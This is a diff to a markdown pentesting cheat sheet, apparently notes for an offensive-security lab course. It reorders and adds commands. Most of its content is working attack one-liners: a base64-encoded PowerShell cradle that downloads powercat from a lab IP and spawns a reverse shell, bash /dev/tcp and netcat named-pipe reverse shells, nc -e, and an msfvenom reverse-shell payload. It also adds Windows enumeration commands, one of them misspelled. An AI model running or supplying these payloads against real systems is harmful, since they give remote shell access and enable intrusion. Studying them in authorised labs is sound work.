@@ -34,14 +34,6 @@ bash -c "bash <oneliner>"
 # example bash reverse shell
 ```
 
-##### Use PowerShell (pwsh on Kali) to base64 encode powercat download & reverse shell
-```powershell
-$TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167/powercat.ps1');powercat -c 192.168.45.167 -p 4444 -e powershell"
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
-$EncodedText =[Convert]::ToBase64String($Bytes)
-# Print encoded text
-$EncodedText       
-```
 
 ##### RDP to Win and mounting a shared folder
 ```bash
@@ -74,18 +66,22 @@ touch /home/kali/webdav/test.txt
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o /tmp/<evil.exe>
 ```
-
+##### Use PowerShell (pwsh on Kali) to base64 encode powercat download & reverse shell
+```powershell
+$TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167/powercat.ps1');powercat -c 192.168.45.167 -p 4444 -e powershell"
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+# Print encoded text
+$EncodedText       
+```
 ##### Bash
 ```bash
 /bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
 ```
-
-
 ##### Using named pipes
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.214 4444 >/tmp/f
 ```
-
 ##### NC
 ```bash
 nc -e /bin/sh 10.0.0.1 1234
@@ -93,11 +89,54 @@ nc -e /bin/sh 10.0.0.1 1234
 
 
 #### PowerShell
-##### Get local users
+##### Get local users on a machine
 ```powershell
 Get-LocalUser
 ```
 
+##### Get existing groups on a machine
+```powershell
+Get-LocalGroup
+```
+
+##### Get members of a specific group
+```powershell
+Get-LocalGroupMemeber <group>
+```
+
+##### Query registry keys to list applications
+```powershell
+# 32-bit Applications
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+# 64-bit Applications
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+##### Get list of running programs
+```powershell
+Get-Process
+```
+
+##### Find file recursively
+```powershell
+Get-ChildItem -Path C:\ -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force
+```
+
+##### Search for process path via PID
+```powershell
+Get-Process -Id <PID> -FileVersionInfo | Select FileName
+```
+
+##### Read contents of a file
+```powershell
+Get-Content file.txt
+```
+
+##### Grep part of a string from output
+```powershell
+... | Out-String -Stream | Select-String "OS{"
+```
 
 
 
